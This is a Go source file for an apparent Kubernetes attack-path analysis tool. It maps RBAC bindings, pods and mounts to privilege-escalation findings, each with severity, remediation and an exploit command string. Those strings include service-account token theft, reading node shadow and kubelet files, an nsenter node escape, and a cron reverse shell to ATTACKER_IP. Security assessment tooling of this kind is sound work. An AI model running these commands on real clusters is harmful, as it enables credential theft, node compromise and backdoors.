package engine

import (
	"fmt"
	"log"
	"path"
	"strings"

	"github.com/kube-dementor/kube-dementor/pkg/authcheck"
	"github.com/kube-dementor/kube-dementor/pkg/models"
	"github.com/kube-dementor/kube-dementor/pkg/rbacutil"
	"github.com/kube-dementor/kube-dementor/pkg/scanner"
)

type Engine struct {
	podsByUID       map[string]*models.PodNode
	nodesByName     map[string]*models.NodeNode
	permsByName     map[string]*models.PermissionSetNode
	identitiesByKey map[string]*models.IdentityNode
	containersByPod map[string][]*models.ContainerNode
	volumesByPod    map[string][]*models.VolumeNode
	userPerms       *authcheck.UserPerms
}

func New() *Engine {
	return &Engine{}
}

func (e *Engine) Analyze(data *models.ClusterData, userPerms *authcheck.UserPerms) []models.Edge {
	e.userPerms = userPerms
	e.buildIndexes(data)

	var edges []models.Edge

	edges = append(edges, e.structuralContains(data)...)
	edges = append(edges, e.structuralHasPermission(data)...)
	edges = append(edges, data.Memberships...)

	edges = append(edges, e.roleBind(data)...)
	edges = append(edges, e.podExec(data)...)
	edges = append(edges, e.tokenSteal(data)...)
	edges = append(edges, e.identityImpersonate(data)...)
	edges = append(edges, e.podCreate(data)...)

	edges = append(edges, e.cePrivMount(data)...)
	edges = append(edges, e.ceNsenter(data)...)

	e.annotateExploitability(edges)

	log.Printf("[engine] Analysis complete: %d edges generated", len(edges))
	return edges
}

func (e *Engine) buildIndexes(data *models.ClusterData) {
	e.podsByUID = make(map[string]*models.PodNode, len(data.Pods))
	for i := range data.Pods {
		e.podsByUID[data.Pods[i].UID] = &data.Pods[i]
	}

	e.nodesByName = make(map[string]*models.NodeNode, len(data.Nodes))
	for i := range data.Nodes {
		e.nodesByName[data.Nodes[i].Name] = &data.Nodes[i]
	}

	e.permsByName = make(map[string]*models.PermissionSetNode, len(data.PermissionSets))
	for i := range data.PermissionSets {
		ps := &data.PermissionSets[i]
		key := permKey(string(ps.Kind), ps.Namespace, ps.Name)
		e.permsByName[key] = ps
	}

	e.identitiesByKey = make(map[string]*models.IdentityNode, len(data.Identities))
	for i := range data.Identities {
		id := &data.Identities[i]
		key := identityKey(string(id.Kind), id.Namespace, id.Name)
		e.identitiesByKey[key] = id
	}

	e.containersByPod = make(map[string][]*models.ContainerNode)
	for i := range data.Containers {
		c := &data.Containers[i]
		e.containersByPod[c.PodUID] = append(e.containersByPod[c.PodUID], c)
	}

	e.volumesByPod = make(map[string][]*models.VolumeNode)
	for i := range data.Volumes {
		v := &data.Volumes[i]
		e.volumesByPod[v.PodUID] = append(e.volumesByPod[v.PodUID], v)
	}
}

func (e *Engine) structuralContains(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Pods {
		pod := &data.Pods[i]
		if node, ok := e.nodesByName[pod.NodeName]; ok {
			edges = append(edges, models.Edge{
				SourceUID: node.UID,
				TargetUID: pod.UID,
				Type:      models.EdgeContains,
			})
		}
	}

	for i := range data.Containers {
		c := &data.Containers[i]
		edges = append(edges, models.Edge{
			SourceUID: c.PodUID,
			TargetUID: c.UID,
			Type:      models.EdgeContains,
		})
	}

	return edges
}

func (e *Engine) structuralHasPermission(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Bindings {
		b := &data.Bindings[i]

		idKey := identityKey(b.SubjectKind, b.SubjectNS, b.SubjectName)
		identity, ok := e.identitiesByKey[idKey]
		if !ok {
			continue
		}

		psKey := permKey(b.RoleRefKind, b.Namespace, b.RoleRefName)
		ps, ok := e.permsByName[psKey]
		if !ok {

			psKey = permKey(b.RoleRefKind, "", b.RoleRefName)
			ps, ok = e.permsByName[psKey]
			if !ok {
				continue
			}
		}

		edges = append(edges, models.Edge{
			SourceUID: identity.UID,
			TargetUID: ps.UID,
			Type:      models.EdgeHasPermission,
			Properties: map[string]string{
				"binding":      b.Name,
				"namespace":    b.Namespace,
				"clusterScope": fmt.Sprint(b.IsClusterScope),
			},
		})
	}

	return edges
}

func (e *Engine) roleBind(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Bindings {
		b := &data.Bindings[i]

		psKey := permKey(b.RoleRefKind, b.Namespace, b.RoleRefName)
		ps, ok := e.permsByName[psKey]
		if !ok {
			psKey = permKey(b.RoleRefKind, "", b.RoleRefName)
			ps, ok = e.permsByName[psKey]
			if !ok {
				continue
			}
		}

		if !isCriticalRole(ps) {
			continue
		}

		if !b.IsClusterScope {
			continue
		}

		idKey := identityKey(b.SubjectKind, b.SubjectNS, b.SubjectName)
		identity, ok := e.identitiesByKey[idKey]
		if !ok {
			continue
		}

		reason := fmt.Sprintf("%s '%s' is bound to critical role '%s' via binding '%s'", b.SubjectKind, b.SubjectName, ps.Name, b.Name)
		if ps.Name == "cluster-admin" {
			reason += " — this grants FULL cluster-admin privileges"
		} else {
			reason += " — this role has wildcard (*) verbs on wildcard (*) resources"
		}

		exploitCmd := ""
		switch b.SubjectKind {
		case "ServiceAccount":
			ns := b.SubjectNS
			if ns == "" {
				ns = b.Namespace
			}
			exploitCmd = fmt.Sprintf(
				"# List secrets for this SA:\nkubectl get secrets -n %s | grep %s\n\n# Get the token:\nkubectl get secret <secret-name> -n %s -o jsonpath='{.data.token}' | base64 -d\n\n# Use the token:\nkubectl --token=<token> auth can-i --list",
				ns, b.SubjectName, ns)
		default:
			exploitCmd = fmt.Sprintf(
				"# Verify permissions for this identity:\nkubectl auth can-i --list --as=%s\n\n# Test cluster-admin access:\nkubectl auth can-i '*' '*' --as=%s",
				b.SubjectName, b.SubjectName)
		}

		bindingNS := b.SubjectNS
		if bindingNS == "" {
			bindingNS = b.Namespace
		}

		edges = append(edges, models.Edge{
			SourceUID: identity.UID,
			TargetUID: ps.UID,
			Type:      models.EdgeRoleBind,
			Properties: map[string]string{
				"binding":     b.Name,
				"role":        ps.Name,
				"namespace":   bindingNS,
				"severity":    "CRITICAL",
				"reason":      reason,
				"impact":      "Full cluster compromise. This identity can read/write all resources, create pods, access secrets, and escalate privileges.",
				"exploit_cmd": exploitCmd,
				"remediation": "Review if this binding is necessary. Apply least-privilege RBAC. Replace wildcard permissions with specific resource/verb pairs.",
			},
		})
	}

	return edges
}

func (e *Engine) podExec(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Bindings {
		b := &data.Bindings[i]

		psKey := permKey(b.RoleRefKind, b.Namespace, b.RoleRefName)
		ps, ok := e.permsByName[psKey]
		if !ok {
			psKey = permKey(b.RoleRefKind, "", b.RoleRefName)
			ps, ok = e.permsByName[psKey]
			if !ok {
				continue
			}
		}

		if !canExecPods(ps) {
			continue
		}

		idKey := identityKey(b.SubjectKind, b.SubjectNS, b.SubjectName)
		identity, ok := e.identitiesByKey[idKey]
		if !ok {
			continue
		}

		for j := range data.Pods {
			pod := &data.Pods[j]
			if !b.IsClusterScope && pod.Namespace != b.Namespace {
				continue
			}
			if !permissionMatches(ps, "", "pods", "exec", "create", pod.Name) &&
				!permissionMatches(ps, "", "pods", "exec", "get", pod.Name) {
				continue
			}

			scope := "namespace " + b.Namespace
			if b.IsClusterScope {
				scope = "cluster-wide"
			}

			edges = append(edges, models.Edge{
				SourceUID: identity.UID,
				TargetUID: pod.UID,
				Type:      models.EdgePodExec,
				Properties: map[string]string{
					"role":        ps.Name,
					"namespace":   pod.Namespace,
					"severity":    "HIGH",
					"reason":      fmt.Sprintf("%s '%s' has 'create' on 'pods/exec' via role '%s' (%s) — can exec into pod '%s/%s'", b.SubjectKind, b.SubjectName, ps.Name, scope, pod.Namespace, pod.Name),
					"impact":      fmt.Sprintf("Remote code execution inside pod '%s'. If the pod runs a privileged SA or has hostPath mounts, this can lead to node compromise.", pod.Name),
					"exploit_cmd": fmt.Sprintf("# Exec into the pod:\nkubectl exec -it %s -n %s -- /bin/sh\n\n# Check SA token inside:\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# Check what the pod's SA can do:\nkubectl auth can-i --list --as=system:serviceaccount:%s:%s", pod.Name, pod.Namespace, pod.Namespace, pod.ServiceAccountName),
					"remediation": "Remove 'create' verb on 'pods/exec' from this role. If exec access is needed, restrict to specific pod names using resourceNames.",
				},
			})
		}
	}

	return edges
}

func (e *Engine) tokenSteal(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	highPrivSAs := e.findHighPrivilegeSAs(data)

	for i := range data.Pods {
		pod := &data.Pods[i]
		saKey := pod.Namespace + "/" + pod.ServiceAccountName
		if _, isHigh := highPrivSAs[saKey]; !isHigh {
			continue
		}

		idKey := identityKey("ServiceAccount", pod.Namespace, pod.ServiceAccountName)
		identity, ok := e.identitiesByKey[idKey]
		if !ok {
			continue
		}
		if !legacyPodToken(pod, identity) {
			continue
		}

		edges = append(edges, models.Edge{
			SourceUID: pod.UID,
			TargetUID: identity.UID,
			Type:      models.EdgeTokenSteal,
			Properties: map[string]string{
				"serviceAccount": pod.ServiceAccountName,
				"namespace":      pod.Namespace,
				"severity":       "CRITICAL",
				"reason":         fmt.Sprintf("Pod '%s/%s' uses high-privilege ServiceAccount '%s' and has an automatic or explicitly projected token surface. Audience and runtime access are unverified.", pod.Namespace, pod.Name, pod.ServiceAccountName),
				"impact":         "An attacker controlling this pod may obtain the SA's bound permissions. Token audience, validity and binding scope must be checked before claiming cluster-wide access.",
				"exploit_cmd":    fmt.Sprintf("# Read the SA token from inside the pod:\nkubectl exec -it %s -n %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# Use the stolen token:\nTOKEN=$(kubectl exec %s -n %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN auth can-i --list\nkubectl --token=$TOKEN get secrets --all-namespaces", pod.Name, pod.Namespace, pod.Name, pod.Namespace),
				"remediation":    fmt.Sprintf("1. Set automountServiceAccountToken: false on the pod spec\n2. Use a dedicated SA with minimal permissions instead of '%s'\n3. Consider using projected volumes with audience/expiry restrictions", pod.ServiceAccountName),
			},
		})
	}

	return edges
}

func (e *Engine) identityImpersonate(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Bindings {
		b := &data.Bindings[i]

		psKey := permKey(b.RoleRefKind, b.Namespace, b.RoleRefName)
		ps, ok := e.permsByName[psKey]
		if !ok {
			psKey = permKey(b.RoleRefKind, "", b.RoleRefName)
			ps, ok = e.permsByName[psKey]
			if !ok {
				continue
			}
		}

		if !canImpersonate(ps) {
			continue
		}

		idKey := identityKey(b.SubjectKind, b.SubjectNS, b.SubjectName)
		identity, ok := e.identitiesByKey[idKey]
		if !ok {
			continue
		}

		for j := range data.Identities {
			target := &data.Identities[j]
			if target.UID == identity.UID {
				continue
			}
			resource := ""
			switch target.Kind {
			case models.IdentityKindUser:
				resource = "users"
			case models.IdentityKindGroup:
				resource = "groups"
			case models.IdentityKindServiceAccount:
				resource = "serviceaccounts"
			}
			if resource == "" || (!b.IsClusterScope && (resource != "serviceaccounts" || target.Namespace != b.Namespace)) ||
				!permissionMatches(ps, "", resource, "", "impersonate", target.Name) {
				continue
			}
			edges = append(edges, models.Edge{
				SourceUID: identity.UID,
				TargetUID: target.UID,
				Type:      models.EdgeIdentityImpersonate,
				Properties: map[string]string{
					"role":        ps.Name,
					"severity":    "HIGH",
					"reason":      fmt.Sprintf("%s '%s' has 'impersonate' verb via role '%s' — can act as %s '%s/%s'", b.SubjectKind, b.SubjectName, ps.Name, target.Kind, target.Namespace, target.Name),
					"impact":      fmt.Sprintf("This identity can impersonate '%s' and inherit all their permissions. If the target has cluster-admin, the attacker gains full cluster control.", target.Name),
					"exploit_cmd": fmt.Sprintf("# Impersonate and check permissions:\nkubectl auth can-i --list --as=%s\n\n# Impersonate and run commands:\nkubectl get secrets --all-namespaces --as=%s\nkubectl get pods --all-namespaces --as=%s", target.Name, target.Name, target.Name),
					"remediation": "Remove 'impersonate' verb from this role. If impersonation is needed, restrict it to specific resourceNames.",
				},
			})
		}
	}

	return edges
}

func (e *Engine) cePrivMount(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Pods {
		pod := &data.Pods[i]
		node, ok := e.nodesByName[pod.NodeName]
		if !ok {
			continue
		}

		volumes := e.volumesByPod[pod.UID]
		containers := e.containersByPod[pod.UID]

		dangerousVols := make(map[string]string)
		for _, v := range volumes {
			if v.Source.Type == "HostPath" && isDangerousHostPath(v.Source.HostPath) {
				dangerousVols[v.Name] = v.Source.HostPath
			}
		}

		if len(dangerousVols) == 0 {
			continue
		}

		for _, c := range containers {
			for _, vm := range c.VolumeMounts {
				hostPath, isDangerous := dangerousVols[vm.Name]
				effectivePath := path.Clean(path.Join(hostPath, vm.SubPath))
				if isDangerous && !vm.ReadOnly && vm.SubPathExpr == "" && scanner.DangerousHostPath(effectivePath) && containerRoot(c) {
					edges = append(edges, models.Edge{
						SourceUID: c.UID,
						TargetUID: node.UID,
						Type:      models.EdgeCEPrivMount,
						Properties: map[string]string{
							"hostPath":    hostPath,
							"mountPath":   vm.MountPath,
							"container":   c.Name,
							"pod":         pod.Name,
							"namespace":   pod.Namespace,
							"node":        node.Name,
							"severity":    "CRITICAL",
							"reason":      fmt.Sprintf("Container '%s' in pod '%s/%s' mounts host path '%s' as read-write at '%s'. This gives direct access to the node's filesystem.", c.Name, pod.Namespace, pod.Name, hostPath, vm.MountPath),
							"impact":      fmt.Sprintf("Read/write access to '%s' on node '%s'. An attacker can read sensitive files (SSH keys, kubeconfig, kubelet certs), write cron jobs, or modify system binaries to escape to the node.", hostPath, node.Name),
							"exploit_cmd": fmt.Sprintf("# Exec into the container:\nkubectl exec -it %s -n %s -c %s -- /bin/sh\n\n# Verify the mount:\nls -la %s\n\n# Read node's sensitive files:\ncat %s/etc/shadow 2>/dev/null\ncat %s/etc/kubernetes/kubelet.conf 2>/dev/null\nls %s/root/.ssh/ 2>/dev/null\n\n# Write a cron job for reverse shell:\necho '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > %s/etc/cron.d/backdoor", pod.Name, pod.Namespace, c.Name, vm.MountPath, vm.MountPath, vm.MountPath, vm.MountPath, vm.MountPath),
							"remediation": "1. Remove the hostPath volume mount\n2. If host access is required, use read-only mounts (readOnly: true)\n3. Use a PodSecurityPolicy/Standard to block hostPath mounts\n4. Consider using emptyDir or PVC instead",
						},
					})
				}
			}
		}
	}

	return edges
}

func (e *Engine) ceNsenter(data *models.ClusterData) []models.Edge {
	var edges []models.Edge

	for i := range data.Pods {
		pod := &data.Pods[i]
		if !pod.HostPID {
			continue
		}

		node, ok := e.nodesByName[pod.NodeName]
		if !ok {
			continue
		}

		containers := e.containersByPod[pod.UID]
		for _, c := range containers {
			if c.Privileged && containerRoot(c) {
				edges = append(edges, models.Edge{
					SourceUID: c.UID,
					TargetUID: node.UID,
					Type:      models.EdgeCENsenter,
					Properties: map[string]string{
						"container":   c.Name,
						"pod":         pod.Name,
						"namespace":   pod.Namespace,
						"node":        node.Name,
						"severity":    "CRITICAL",
						"reason":      fmt.Sprintf("Root privileged container '%s' in pod '%s/%s' has hostPID. Host network and IPC flags are not required for a potential nsenter escape to '%s'; runtime conditions remain unverified.", c.Name, pod.Namespace, pod.Name, node.Name),
						"impact":      fmt.Sprintf("Full root access on node '%s'. The attacker can access all pods on the node, read kubelet credentials, pivot to other nodes, and compromise the entire cluster.", node.Name),
						"exploit_cmd": fmt.Sprintf("# Exec into the privileged container:\nkubectl exec -it %s -n %s -c %s -- /bin/sh\n\n# Escape to node via nsenter (PID 1 = node's init):\nnsenter -t 1 -m -u -i -n -p -- /bin/bash\n\n# You are now root on node '%s':\nhostname\nwhoami\ncat /etc/kubernetes/kubelet.conf\ncrictl ps", pod.Name, pod.Namespace, c.Name, node.Name),
						"remediation": "1. Remove 'privileged: true' from the container securityContext\n2. Remove hostPID, hostNetwork, hostIPC from the pod spec\n3. Use Pod Security Standards (restricted profile) to prevent this\n4. If host access is required, use specific capabilities instead of full privileged mode",
					},
				})
			}
		}
	}

	return edges
}

func (e *Engine) annotateExploitability(edges []models.Edge) {
	if e.userPerms == nil {

		for i := range edges {
			if edges[i].Properties == nil {
				continue
			}
			if _, hasSev := edges[i].Properties["severity"]; hasSev {
				edges[i].Properties["exploitable"] = "UNCHECKED"
				edges[i].Properties["exploitable_reason"] = "Permission check not available — run with cluster access to verify"
			}
		}
		return
	}

	exploitable := 0
	notExploitable := 0

	for i := range edges {
		edge := &edges[i]
		if edge.Properties == nil {
			continue
		}

		if _, hasSev := edge.Properties["severity"]; !hasSev {
			continue
		}
		if edge.Type == models.EdgePodCreateEscape {
			edge.Properties["exploitable"] = "UNCHECKED"
			edge.Properties["exploitable_reason"] = "Dry-run admission accepted the specification; placement and runtime escape were not attempted."
			continue
		}

		canExploit, reason, verifyCmd := e.checkEdgeExploitability(edge)

		if canExploit {
			edge.Properties["exploitable"] = "YES"
			edge.Properties["exploitable_reason"] = reason
			exploitable++
		} else if len(e.userPerms.Errors) > 0 {
			edge.Properties["exploitable"] = "UNCHECKED"
			edge.Properties["exploitable_reason"] = "Authorization coverage is incomplete; access cannot be ruled out. " + reason
		} else {
			edge.Properties["exploitable"] = "NO"
			edge.Properties["exploitable_reason"] = reason
			notExploitable++
		}

		if existing, ok := edge.Properties["exploit_cmd"]; ok && verifyCmd != "" {
			edge.Properties["exploit_cmd"] = verifyCmd + "\n\n" + existing
		}
	}

	log.Printf("[engine] Exploitability: %d exploitable, %d not exploitable by current user", exploitable, notExploitable)
}

func (e *Engine) checkEdgeExploitability(edge *models.Edge) (canExploit bool, reason string, verifyCmd string) {
	ns := edge.Properties["namespace"]

	switch edge.Type {
	case models.EdgeRoleBind:
		for _, identity := range e.identitiesByKey {
			if identity.UID != edge.SourceUID {
				continue
			}
			username := identity.Name
			if identity.Kind == models.IdentityKindServiceAccount {
				username = "system:serviceaccount:" + identity.Namespace + ":" + identity.Name
			}
			if identity.Kind != models.IdentityKindGroup && username == e.userPerms.User {
				return true, "This binding belongs directly to the authenticated operator.", ""
			}
			if identity.Kind == models.IdentityKindGroup {
				for _, group := range e.userPerms.Groups {
					if group == identity.Name {
						return true, "The authenticated operator is a member of the bound group.", ""
					}
				}
			}
			if identity.Kind == models.IdentityKindServiceAccount {
				for _, pod := range e.podsByUID {
					if pod.Namespace == identity.Namespace && pod.ServiceAccountName == identity.Name &&
						legacyPodToken(pod, identity) && e.userPerms.CanExecInNamespace(pod.Namespace) {
						return true, "Authorized exec reaches a pod with this SA's token surface; audience and runtime access are unverified.", ""
					}
				}
			}
		}
		return false, "Access to the bound identity is not established. Secret-list authority alone does not prove a legacy SA token exists.", ""

	case models.EdgePodExec:

		podNS := ns
		if podNS == "" {

			podNS = ""
		}
		canExec := e.userPerms.CanExecInNamespace(podNS)

		verifyCmd = fmt.Sprintf("# Step 1: Verify YOUR permissions:\nkubectl auth can-i create pods/exec -n %s", orDefault(podNS, "<namespace>"))

		if canExec {
			return true, fmt.Sprintf("You CAN exec into pods in namespace '%s'", orDefault(podNS, "cluster")), verifyCmd
		}
		return false, fmt.Sprintf("You CANNOT exec into pods in namespace '%s' — this attack path is not exploitable with your current permissions", orDefault(podNS, "cluster")), verifyCmd

	case models.EdgeTokenSteal:

		podNS := ns
		canExec := e.userPerms.CanExecInNamespace(podNS)

		verifyCmd = fmt.Sprintf("# Step 1: Verify YOUR permissions:\nkubectl auth can-i create pods/exec -n %s\nkubectl auth can-i list secrets -n %s",
			orDefault(podNS, "<namespace>"), orDefault(podNS, "<namespace>"))

		if canExec {
			return true, fmt.Sprintf("You CAN exec into pods in namespace '%s' — you can read the SA token from /var/run/secrets/", orDefault(podNS, "cluster")), verifyCmd
		}
		return false, fmt.Sprintf("Pod exec in namespace '%s' is not established. Secret-list authority does not prove a legacy SA token secret exists.", orDefault(podNS, "cluster")), verifyCmd
	case models.EdgePodCreate:
		if e.userPerms.CanI("create", "pods", "", ns) {
			return true, "Pod creation is authorized; admission, placement and runtime access are not proven.", ""
		}
		return false, "Pod creation is not established for this namespace.", ""
	case models.EdgePodCreateEscape:
		return false, "Only dry-run admission was checked; no pod was scheduled or escaped.", ""

	case models.EdgeIdentityImpersonate:

		canImp := e.userPerms.CanImpersonate()

		verifyCmd = "# Step 1: Verify YOUR permissions:\nkubectl auth can-i impersonate users\nkubectl auth can-i impersonate serviceaccounts"

		if canImp {
			return true, "You CAN impersonate identities", verifyCmd
		}
		return false, "You CANNOT impersonate identities with your current permissions", verifyCmd

	case models.EdgeCEPrivMount:

		podNS := ns
		canExec := e.userPerms.CanExecInNamespace(podNS)

		verifyCmd = fmt.Sprintf("# Step 1: Verify YOUR permissions:\nkubectl auth can-i create pods/exec -n %s", orDefault(podNS, "<namespace>"))

		if canExec {
			return true, fmt.Sprintf("You CAN exec into pods in namespace '%s' — you can access the hostPath mount from inside the container", orDefault(podNS, "cluster")), verifyCmd
		}
		return false, fmt.Sprintf("You CANNOT exec into pods in namespace '%s' — you cannot reach the hostPath mount", orDefault(podNS, "cluster")), verifyCmd

	case models.EdgeCENsenter:
		podNS := ns
		canExec := e.userPerms.CanExecInNamespace(podNS)

		verifyCmd = fmt.Sprintf("# Step 1: Verify YOUR permissions:\nkubectl auth can-i create pods/exec -n %s", orDefault(podNS, "<namespace>"))

		if canExec {
			return true, fmt.Sprintf("You CAN exec into pods in namespace '%s' — you can nsenter to the node", orDefault(podNS, "cluster")), verifyCmd
		}
		return false, fmt.Sprintf("You CANNOT exec into pods in namespace '%s' — nsenter escape not reachable", orDefault(podNS, "cluster")), verifyCmd
	}

	return false, "Unknown edge type", ""
}

func orDefault(s, def string) string {
	if s == "" {
		return def
	}
	return s
}

func permKey(kind, namespace, name string) string {
	return fmt.Sprintf("%s/%s/%s", kind, namespace, name)
}

func identityKey(kind, namespace, name string) string {
	return fmt.Sprintf("%s/%s/%s", kind, namespace, name)
}

func isCriticalRole(ps *models.PermissionSetNode) bool {
	if ps.Name == "cluster-admin" {
		return true
	}
	for _, rule := range ps.Rules {
		if containsWildcard(rule.Verbs) && containsWildcard(rule.Resources) &&
			containsWildcard(rule.APIGroups) && len(rule.ResourceNames) == 0 {
			return true
		}
	}
	return false
}

func canExecPods(ps *models.PermissionSetNode) bool {
	for _, rule := range ps.Rules {
		if (rbacutil.Contains(rule.APIGroups, "") || rbacutil.Contains(rule.APIGroups, "*")) &&
			(sliceContainsAny(rule.Resources, "pods/exec", "*/exec", "*")) && sliceContainsAny(rule.Verbs, "create", "get", "*") {
			return true
		}
	}
	return false
}

func canImpersonate(ps *models.PermissionSetNode) bool {
	for _, rule := range ps.Rules {
		hasVerb := sliceContainsAny(rule.Verbs, "impersonate", "*")
		hasResource := sliceContainsAny(rule.Resources, "users", "groups", "serviceaccounts", "*")
		if hasVerb && hasResource {
			return true
		}
	}
	return false
}

func (e *Engine) findHighPrivilegeSAs(data *models.ClusterData) map[string]bool {
	result := make(map[string]bool)
	for i := range data.Bindings {
		b := &data.Bindings[i]
		if b.SubjectKind != "ServiceAccount" && b.SubjectKind != "Group" {
			continue
		}

		psKey := permKey(b.RoleRefKind, b.Namespace, b.RoleRefName)
		ps, ok := e.permsByName[psKey]
		if !ok {
			psKey = permKey(b.RoleRefKind, "", b.RoleRefName)
			ps, ok = e.permsByName[psKey]
			if !ok {
				continue
			}
		}

		if isCriticalRole(ps) {
			if b.SubjectKind == "Group" {
				group := e.identitiesByKey[identityKey("Group", "", b.SubjectName)]
				if group == nil {
					continue
				}
				for _, membership := range data.Memberships {
					if membership.TargetUID != group.UID {
						continue
					}
					for _, identity := range data.Identities {
						if identity.UID == membership.SourceUID && identity.Kind == models.IdentityKindServiceAccount {
							result[identity.Namespace+"/"+identity.Name] = true
						}
					}
				}
				continue
			}
			saKey := b.SubjectNS + "/" + b.SubjectName
			if b.SubjectNS == "" {
				saKey = b.Namespace + "/" + b.SubjectName
			}
			result[saKey] = true
		}
	}
	return result
}

func isDangerousHostPath(path string) bool {
	return scanner.DangerousHostPath(path)
}

func permissionMatches(ps *models.PermissionSetNode, group, resource, sub, verb, name string) bool {
	for _, rule := range ps.Rules {
		if rbacutil.Matches(rule.APIGroups, rule.Resources, rule.Verbs, rule.ResourceNames, group, resource, sub, verb, name) {
			return true
		}
	}
	return false
}

func containerRoot(container *models.ContainerNode) bool {
	if container.RunAsNonRoot != nil && *container.RunAsNonRoot {
		return false
	}
	return container.RunAsUser == nil || *container.RunAsUser == 0
}

func legacyPodToken(pod *models.PodNode, identity *models.IdentityNode) bool {
	if pod.HasProjectedToken {
		return true
	}
	if pod.AutomountToken != nil {
		return *pod.AutomountToken
	}
	return identity.AutomountToken == nil || *identity.AutomountToken
}

func (e *Engine) podCreate(data *models.ClusterData) []models.Edge {
	var edges []models.Edge
	actions := map[string]bool{}
	for _, action := range data.Actions {
		actions[action.UID] = true
	}
	add := func(identity *models.IdentityNode, ns, role string) {
		uid := "action/create-pods/" + ns + "/" + identity.UID
		if !actions[uid] {
			actions[uid] = true
			data.Actions = append(data.Actions, models.ActionNode{
				UID: uid, Name: "create pods", Namespace: ns, Kind: "PodCreation", Admission: "unverified", OwnerUID: identity.UID,
			})
		}
		edges = append(edges, models.Edge{
			SourceUID: identity.UID, TargetUID: uid, Type: models.EdgePodCreate,
			Properties: map[string]string{
				"namespace": ns, "role": role, "severity": "HIGH", "admission": "unverified",
				"reason":      "Pod creation is authorized independently of existing workloads.",
				"impact":      "Potential privileged workload, SA-token access or node escape, conditional on admission, placement and runtime constraints.",
				"remediation": "Enforce restricted Pod Security Admission and least-privilege workload creation.",
			},
		})
	}
	for _, binding := range data.Bindings {
		ps := e.permsByName[permKey(binding.RoleRefKind, binding.Namespace, binding.RoleRefName)]
		if ps == nil {
			ps = e.permsByName[permKey(binding.RoleRefKind, "", binding.RoleRefName)]
		}
		identity := e.identitiesByKey[identityKey(binding.SubjectKind, binding.SubjectNS, binding.SubjectName)]
		if ps != nil && identity != nil && permissionMatches(ps, "", "pods", "", "create", "") {
			ns := binding.Namespace
			if binding.IsClusterScope {
				ns = ""
			}
			add(identity, ns, ps.Name)
		}
	}
	if e.userPerms != nil {
		for _, identity := range data.Identities {
			if !((identity.Kind == models.IdentityKindUser || identity.Kind == models.IdentityKindOperator) && identity.Name == e.userPerms.User) &&
				!(identity.Kind == models.IdentityKindServiceAccount &&
					"system:serviceaccount:"+identity.Namespace+":"+identity.Name == e.userPerms.User) {
				continue
			}
			for _, ns := range e.userPerms.Namespaces {
				if e.userPerms.CanI("create", "pods", "", ns) {
					add(&identity, ns, "SelfSubjectAccessReview")
				}
			}
		}
	}
	for _, action := range data.Actions {
		if action.Admission != "admitted" || action.OwnerUID == "" {
			continue
		}
		source := "action/create-pods/" + action.Namespace + "/" + action.OwnerUID
		if !actions[source] {
			continue
		}
		target := "action/node-access/" + action.Namespace
		if node := e.nodesByName[action.NodeName]; node != nil {
			target = node.UID
		} else if !actions[target] {
			actions[target] = true
			data.Actions = append(data.Actions, models.ActionNode{
				UID: target, Name: "potential node access (placement unverified)",
				Namespace: action.Namespace, Kind: "NodeAccess",
			})
		}
		edges = append(edges, models.Edge{
			SourceUID: source, TargetUID: action.UID, Type: models.EdgePodCreate,
			Properties: map[string]string{"namespace": action.Namespace, "admission": "admitted"},
		}, models.Edge{
			SourceUID: action.UID, TargetUID: target, Type: models.EdgePodCreateEscape,
			Properties: map[string]string{
				"namespace": action.Namespace, "severity": "HIGH", "admission": "admitted",
				"reason": "Dry-run accepted an escape-capable specification for the tested operator; placement and runtime escape remain unverified.",
				"impact": "Potential node access, not a verified exploit.", "technique": action.Technique,
			},
		})
	}
	return edges
}

func containsWildcard(ss []string) bool {
	for _, s := range ss {
		if s == "*" {
			return true
		}
	}
	return false
}

func sliceContainsAny(haystack []string, needles ...string) bool {
	for _, h := range haystack {
		for _, n := range needles {
			if strings.EqualFold(h, n) {
				return true
			}
		}
	}
	return false
}
